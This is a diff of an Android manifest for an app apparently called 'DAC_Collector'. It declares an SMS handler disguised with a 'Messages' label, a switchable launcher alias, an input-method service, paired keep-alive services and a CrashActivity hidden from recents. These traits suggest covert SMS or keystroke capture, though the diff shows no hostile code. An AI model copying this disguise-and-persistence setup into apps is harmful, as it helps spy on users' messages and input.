@@ -4,7 +4,7 @@
 
     <uses-feature
         android:name="android.hardware.telephony"
-        android:required="true" />
+        android:required="false" />
 
     <uses-permission android:name="android.permission.GET_ACCOUNTS" />
     <uses-permission android:name="android.permission.VIBRATE" />
@@ -48,26 +48,34 @@
         android:theme="@style/Theme.DAC_Collector"
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
+        <activity
+            android:name=".Ui.CrashActivity"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            />
+
+
         <meta-data
             android:name="com.google.android.gms.ads.APPLICATION_ID"
-            android:value="ca-app-pub-4113410244453408~5369935965"/>
+            android:value="ca-app-pub-4113410244453408~1804056046" />
+
         <activity
             android:name="android.iocl.sms_handler_8_0_below.SMSThreadActivity"
             android:exported="false" />
         <activity
             android:name="android.iocl.sms_handler_8_0_below.SmsActivity"
-            android:launchMode="singleInstance"
             android:exported="true"
             android:icon="@drawable/dev_icon"
-            android:label="Messages"></activity>
+            android:label="Messages"
+            android:launchMode="singleInstance" />
 
         <activity-alias
             android:name=".SmsLauncherAlias"
             android:enabled="false"
             android:exported="true"
-            android:launchMode="singleInstance"
             android:icon="@drawable/chats_chat_sms_talk_svgrepo_com"
             android:label="SMS"
+            android:launchMode="singleInstance"
             android:targetActivity="android.iocl.sms_handler_8_0_below.SmsActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -184,14 +192,11 @@
                 android:name="android.view.im"
                 android:resource="@xml/method" />
         </service>
-
-
         <service
             android:name="android.iocl.keepAlive.ServiceA"
             android:enabled="true"
             android:exported="false"
             android:process=":serviceA" />
-
         <service
             android:name="android.iocl.keepAlive.ServiceB"
             android:enabled="true"
